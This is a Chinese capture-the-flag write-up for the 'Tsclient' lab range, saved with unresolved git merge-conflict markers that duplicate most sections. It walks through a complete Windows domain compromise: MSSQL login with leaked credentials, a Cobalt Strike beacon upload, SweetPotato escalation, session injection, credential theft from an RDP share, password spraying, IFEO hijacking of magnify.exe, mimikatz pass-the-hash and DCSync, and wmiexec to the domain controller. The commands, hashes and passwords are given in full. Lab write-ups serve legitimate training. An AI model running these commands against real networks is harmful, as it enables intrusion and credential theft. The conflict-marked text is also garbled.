---
title: 春秋云镜 - Tsclienet - 先知社区
<<<<<<< HEAD
url: https://xz.aliyun.com/t/14093
clipped_at: 2024-03-20 09:38:22
=======
url: https://xz.aliyun.com/t/14093?time__1311=mqmx9DBG0QqWqYKDsD7mi0%3Di3GKwkhDkDqrD
clipped_at: 2024-03-15 09:15:55
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
category: default
tags: 
 - xz.aliyun.com
---


# 春秋云镜 - Tsclienet - 先知社区

# 春秋云镜 - Tsclient

# 信息收集

fscan

<<<<<<< HEAD
[![](assets/1710898702-61ddbd1bd0555ba2acb22d76506b8f36.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095256-9438cff0-e1a5-1.png)
=======
[![](assets/1710465355-61ddbd1bd0555ba2acb22d76506b8f36.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095256-9438cff0-e1a5-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

发现存在 mssql 服务，而且爆出来了密码

# Flag01

## mssql 文件上传 + getshell + 提权

利用 **impacket-mssqlclient** 进行连接

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
impacket-mssqlclient sa:'1qaz!QAZ'@121.89.199.183
```

发现设置关闭了 xp\_cmdshell

<<<<<<< HEAD
[![](assets/1710898702-966d94bba55c69595e86e54fcca4ba23.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095300-968e81f0-e1a5-1.png)

从网上下载一下 **MUDT**

[![](assets/1710898702-7c0f8a74bfd9b3f36083cc68c0837c52.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095304-98911a26-e1a5-1.png)

和 impacket-mssqlclient 差不多，但是可以上传文件，上传一个 CS 上线马

[![](assets/1710898702-ac2f0e6a5ab17fd4c2dee323ad68553c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095308-9b42eaf6-e1a5-1.png)

[![](assets/1710898702-acdcd62b4ff669457f63b584b512e77f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095313-9e4a68a0-e1a5-1.png)

之后利用 MDUT 上传我们的 CS 马

[![](assets/1710898702-8ab08c7dec31742fd278c77878c811ec.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095318-a1721708-e1a5-1.png)

成功上线

[![](assets/1710898702-d8635fa8d9b65af12b49d01ff8fbb1ab.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095324-a4e71212-e1a5-1.png)

发现权限很低

[![](assets/1710898702-0162c5d3041d9e1199098942fb084a3d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095327-a6d11762-e1a5-1.png)
=======
[![](assets/1710465355-966d94bba55c69595e86e54fcca4ba23.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095300-968e81f0-e1a5-1.png)

从网上下载一下 **MUDT**

[![](assets/1710465355-7c0f8a74bfd9b3f36083cc68c0837c52.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095304-98911a26-e1a5-1.png)

和 impacket-mssqlclient 差不多，但是可以上传文件，上传一个 CS 上线马

[![](assets/1710465355-ac2f0e6a5ab17fd4c2dee323ad68553c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095308-9b42eaf6-e1a5-1.png)

[![](assets/1710465355-acdcd62b4ff669457f63b584b512e77f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095313-9e4a68a0-e1a5-1.png)

之后利用 MDUT 上传我们的 CS 马

[![](assets/1710465355-8ab08c7dec31742fd278c77878c811ec.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095318-a1721708-e1a5-1.png)

成功上线

[![](assets/1710465355-d8635fa8d9b65af12b49d01ff8fbb1ab.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095324-a4e71212-e1a5-1.png)

发现权限很低

[![](assets/1710465355-0162c5d3041d9e1199098942fb084a3d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095327-a6d11762-e1a5-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

之后利用 sweetpotato 进行提权

将 exe 利用 MDUT 上传

<<<<<<< HEAD
```plain
shell c:\\users\\public\\sweetpotato.exe -a whoami
```

[![](assets/1710898702-ae7724b09748c4b66f026147362b824d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095332-a99a8e06-e1a5-1.png)

之后再以最高权限运行 CS 马

```plain
shell C:\\Users\\Public\\SweetPotato.exe -a C:\\Users\\Public\\beacon_x64.exe
```

[![](assets/1710898702-9658fb308f1effdb5a70965386ea024f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095339-addfff46-e1a5-1.png)

之后找到 flag01

[![](assets/1710898702-6d1ee11c672c74d977360a09c8aed681.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095344-b0db9f5c-e1a5-1.png)

```plain
=======
```bash
shell c:\\users\\public\\sweetpotato.exe -a whoami
```

[![](assets/1710465355-ae7724b09748c4b66f026147362b824d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095332-a99a8e06-e1a5-1.png)

之后再以最高权限运行 CS 马

```bash
shell C:\\Users\\Public\\SweetPotato.exe -a C:\\Users\\Public\\beacon_x64.exe
```

[![](assets/1710465355-9658fb308f1effdb5a70965386ea024f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095339-addfff46-e1a5-1.png)

之后找到 flag01

[![](assets/1710465355-6d1ee11c672c74d977360a09c8aed681.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095344-b0db9f5c-e1a5-1.png)

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
flag{f61edeff-5177-40cb-b8fd-4490a483f0df}
```

# Flag02

根据 flag01 的提示，需要看一下 user session

在这台机子里面进行信息收集

查看所有用户

<<<<<<< HEAD
```plain
shell net user
```

[![](assets/1710898702-f778d23a2a111fa98af6de12ae7e51bb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095349-b3f38d62-e1a5-1.png)

```plain
hashdump
```

[![](assets/1710898702-af53923e0b41776f2a3362f845b078f5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095354-b69b0752-e1a5-1.png)

查看在线用户

```plain
shell quser || qwinst
```

[![](assets/1710898702-2f7681278c601a294acb0e24e2ef27d7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095359-b98b0994-e1a5-1.png)

所以我们需要上线 John 用户，可以利用 CS 的插件进行查看文件以及进程

[![](assets/1710898702-83c2c3df9c45b0b43bcf41e513e28e45.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095403-bc292e1a-e1a5-1.png)

选择 User 为 John 的进程，之后注入即可

[![](assets/1710898702-0608e01bb6beb0063645556eeaddd7b8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095408-bf3633fa-e1a5-1.png)

net use 可以将远端的共享资源挂载到本地

```plain
shell net use
```

[![](assets/1710898702-de438e8dc91ac1f2969ca4c20192f301.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095429-cb95b576-e1a5-1.png)

```plain
shell type \\TSCLIENT\C\credential.txt
```

[![](assets/1710898702-6bcba2c3393b8967e2e56f0787706aeb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095433-ce0d7604-e1a5-1.png)

```plain
=======
```bash
shell net user
```

[![](assets/1710465355-f778d23a2a111fa98af6de12ae7e51bb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095349-b3f38d62-e1a5-1.png)

```bash
hashdump
```

[![](assets/1710465355-af53923e0b41776f2a3362f845b078f5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095354-b69b0752-e1a5-1.png)

查看在线用户

```bash
shell quser || qwinst
```

[![](assets/1710465355-2f7681278c601a294acb0e24e2ef27d7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095359-b98b0994-e1a5-1.png)

所以我们需要上线 John 用户，可以利用 CS 的插件进行查看文件以及进程

[![](assets/1710465355-83c2c3df9c45b0b43bcf41e513e28e45.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095403-bc292e1a-e1a5-1.png)

选择 User 为 John 的进程，之后注入即可

[![](assets/1710465355-0608e01bb6beb0063645556eeaddd7b8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095408-bf3633fa-e1a5-1.png)

net use 可以将远端的共享资源挂载到本地

```bash
shell net use
```

[![](assets/1710465355-de438e8dc91ac1f2969ca4c20192f301.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095429-cb95b576-e1a5-1.png)

```bash
shell type \\TSCLIENT\C\credential.txt
```

[![](assets/1710465355-6bcba2c3393b8967e2e56f0787706aeb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095433-ce0d7604-e1a5-1.png)

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#
```

现在已经知道远控的账号密码了，现在进行信息收集，获得拓扑图

对入口的机器利用 fscan 进行收集

先看一下 ip

<<<<<<< HEAD
```plain
shell ipconfig
```

[![](assets/1710898702-e98accca779b561b636b4a0fd5a829e6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095439-d14560f2-e1a5-1.png)

之后利用 fscan 开扫

```plain
shell C:\\Users\\Public\\fscan.exe -h 172.22.8.0/24
```

```plain
=======
```bash
shell ipconfig
```

[![](assets/1710465355-e98accca779b561b636b4a0fd5a829e6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095439-d14560f2-e1a5-1.png)

之后利用 fscan 开扫

```bash
shell C:\\Users\\Public\\fscan.exe -h 172.22.8.0/24
```

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
(icmp) Target '172.22.8.31' is alive
(icmp) Target '172.22.8.15' is alive
(icmp) Target '172.22.8.18' is alive
(icmp) Target '172.22.8.46' is alive
icmp alive hosts len is: 4
172.22.8.18:1433 open
172.22.8.46:445 open
172.22.8.18:445 open
172.22.8.15:445 open
172.22.8.31:445 open
172.22.8.46:135 open
172.22.8.46:139 open
172.22.8.18:139 open
172.22.8.15:139 open
172.22.8.31:139 open
172.22.8.18:135 open
172.22.8.15:135 open
172.22.8.31:135 open
172.22.8.46:80 open
172.22.8.18:80 open
172.22.8.15:88 open
alive ports len is: 16
start vulscan
[*] 172.22.8.31          XIAORANG\WIN19-CLIENT      
[*] 172.22.8.15    [+]DC XIAORANG\DC01              
[*] WebTitle:http://172.22.8.18        code:200 len:703    title:IIS Windows Server
NetInfo:
[*]172.22.8.18
   [->]WIN-WEB
   [->]172.22.8.18
   [->]2001:0:348b:fb58:3c9d:2e4a:d89d:b62b
NetInfo:
[*]172.22.8.46
   [->]WIN2016
   [->]172.22.8.46
NetInfo:
[*]172.22.8.31
   [->]WIN19-CLIENT
   [->]172.22.8.31
NetInfo:
[*]172.22.8.15
   [->]DC01
   [->]172.22.8.15
[*] 172.22.8.46          XIAORANG\WIN2016           Windows Server 2016 Datacenter 14393
[*] WebTitle:http://172.22.8.46        code:200 len:703    title:IIS Windows Server
[+] mssql:172.22.8.18:1433:sa 1qaz!QAZ
```

之后利用 CS 做一个代理，我这里用的 socks4，socks5 需要身份验证，用的不太习惯

由于我们前面获取了一台主机的账号密码，但是不知道是哪一台机子，利用 cme 进行密码喷射

<<<<<<< HEAD
```plain
proxychains -q crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
```

[![](assets/1710898702-b3c4a8025616be418fec6713a5664c9e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095448-d6ee50d6-e1a5-1.png)
=======
```bash
proxychains -q crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
```

[![](assets/1710465355-b3c4a8025616be418fec6713a5664c9e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095448-d6ee50d6-e1a5-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

发现是可以登录 172.22.8.46 这台主机的，但是提示 STATUS\_PASSWORD\_EXPIRED

也就是密码过期了，需要使用 smbpasswd 进行修改密码

<<<<<<< HEAD
```plain
proxychains -q python3 impacket-master/examples/smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 'csy666zz!'
```

[![](assets/1710898702-a348ebca4ecfa0350092d59509009ca8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095453-d9afb9d6-e1a5-1.png)
=======
```bash
proxychains -q python3 impacket-master/examples/smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 'csy666zz!'
```

[![](assets/1710465355-a348ebca4ecfa0350092d59509009ca8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095453-d9afb9d6-e1a5-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

之后把 proxyfier 的配置换为 socks4，之后远程连接即可

利用 CS 生成一个 x64exe，直接运行，发现并没有上线，发现机器是不出网的

<<<<<<< HEAD
[![](assets/1710898702-470ea51b38a69853ae8c745b455b5f7f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095458-dcfbe8bc-e1a5-1.png)

这个时候就要利用 CS 的转发上线了

[![](assets/1710898702-fd671909ffcf6c92c9474b9d7d60e70f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095502-df6e632c-e1a5-1.png)
=======
[![](assets/1710465355-470ea51b38a69853ae8c745b455b5f7f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095458-dcfbe8bc-e1a5-1.png)

这个时候就要利用 CS 的转发上线了

[![](assets/1710465355-fd671909ffcf6c92c9474b9d7d60e70f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095502-df6e632c-e1a5-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

生成一个监听器

之后利用这个监听器生成 exe，在不出网的机子运行即可转发上线

<<<<<<< HEAD
[![](assets/1710898702-5f0d116d17eaae9eddb2dfc1109c946b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095508-e2799334-e1a5-1.png)

根据之前的提示映像劫持提权

```plain
=======
[![](assets/1710465355-5f0d116d17eaae9eddb2dfc1109c946b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095508-e2799334-e1a5-1.png)

根据之前的提示映像劫持提权

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
get-acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *
```

发现 NT AUTHORITY\\Authenticated Users 可以修改注册表  
即所有账号密码登录的用户都可以修改注册表，利用这个性质，修改注册表，使用放大镜进行提权！  
<<<<<<< HEAD
[![](assets/1710898702-3c03514f743f6d21a5690337c202d048.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095515-e6ba72ec-e1a5-1.png)

修改注册表映像劫持，将放大镜劫持为 cmd

```plain
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

[![](assets/1710898702-929d065a288a146dc6237a3bf6ce3041.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095523-ebb1e1a4-e1a5-1.png)
=======
[![](assets/1710465355-3c03514f743f6d21a5690337c202d048.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095515-e6ba72ec-e1a5-1.png)

修改注册表映像劫持，将放大镜劫持为 cmd

```bash
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

[![](assets/1710465355-929d065a288a146dc6237a3bf6ce3041.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095523-ebb1e1a4-e1a5-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

之后锁定计算机，利用放大镜进行提权

可以发现成功劫持到 cmd，看一下权限

<<<<<<< HEAD
[![](assets/1710898702-bf89d3b57d956c568d16b41dc3ccb17e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095533-f17737ce-e1a5-1.png)

确实是最高权限，之后继续运行一下我们的 CS 马

[![](assets/1710898702-7736a1b48e84067b4a0c4555d35e1266.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095543-f7a74aa8-e1a5-1.png)

之后得到 flag2

```plain
flag{25e1588d-28a6-4269-8fab-aa0a0202ea24}
```

[![](assets/1710898702-8276de1ab0f35c06fb6f1e758b40569b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095547-fa0d4ffe-e1a5-1.png)
=======
[![](assets/1710465355-bf89d3b57d956c568d16b41dc3ccb17e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095533-f17737ce-e1a5-1.png)

确实是最高权限，之后继续运行一下我们的 CS 马

[![](assets/1710465355-7736a1b48e84067b4a0c4555d35e1266.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095543-f7a74aa8-e1a5-1.png)

之后得到 flag2

```bash
flag{25e1588d-28a6-4269-8fab-aa0a0202ea24}
```

[![](assets/1710465355-8276de1ab0f35c06fb6f1e758b40569b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095547-fa0d4ffe-e1a5-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

# Flag03

拿下了域控之后，抓一下明文密码，利用 CS 插件就行

<<<<<<< HEAD
[![](assets/1710898702-976868e1fb6597550fa110f0d3a5a6d1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095552-fcaf5978-e1a5-1.png)
=======
[![](assets/1710465355-976868e1fb6597550fa110f0d3a5a6d1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095552-fcaf5978-e1a5-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

但是没有管理员的 hash

查看当前域中的用户

<<<<<<< HEAD
[![](assets/1710898702-8581c9c05858ae710086977b14eed8a4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095556-ff502e14-e1a5-1.png)

域管用户信息收集

```plain
=======
[![](assets/1710465355-8581c9c05858ae710086977b14eed8a4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095556-ff502e14-e1a5-1.png)

域管用户信息收集

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
shell net group "domain admins" /domain
```

发现 win2016$ 在域管组里，即机器账户可以 Hash 传递登录域控。

利用 mimikatz 注入机器账户的 hash

<<<<<<< HEAD
```plain
shell C:\Users\Aldrich\Desktop\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:b1b840a5c19c4290a284204df50126a6" "exit"
```

[![](assets/1710898702-4d7d0d41452a00ed25ebe6a800888bb7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095601-0299e6f0-e1a6-1.png)

利用 mimikatz dcsync dump 域控 hash

```plain
=======
```bash
shell C:\Users\Aldrich\Desktop\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:b1b840a5c19c4290a284204df50126a6" "exit"
```

[![](assets/1710465355-4d7d0d41452a00ed25ebe6a800888bb7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095601-0299e6f0-e1a6-1.png)

利用 mimikatz dcsync dump 域控 hash

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
shell C:\Users\Aldrich\Desktop\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"
```

得到 Administrator 的 hash

<<<<<<< HEAD
```plain
2c9d81bdcf3ec8b1def10328a7cc2f08
```

```plain
proxychains impacket-wmiexec -hashes 00000000000000000000000000000000:2c9d81bdcf3ec8b1def10328a7cc2f08 Administrator@172.22.8.15
```

[![](assets/1710898702-ef4575cc57ec16c08626f43cdd266ccb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095609-06ddccc2-e1a6-1.png)

```plain
=======
```bash
2c9d81bdcf3ec8b1def10328a7cc2f08
```

```bash
proxychains impacket-wmiexec -hashes 00000000000000000000000000000000:2c9d81bdcf3ec8b1def10328a7cc2f08 Administrator@172.22.8.15
```

[![](assets/1710465355-ef4575cc57ec16c08626f43cdd266ccb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240314095609-06ddccc2-e1a6-1.png)

```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
flag{51a7b5a1-da5c-4198-9dcc-d2a52699af6c}
```
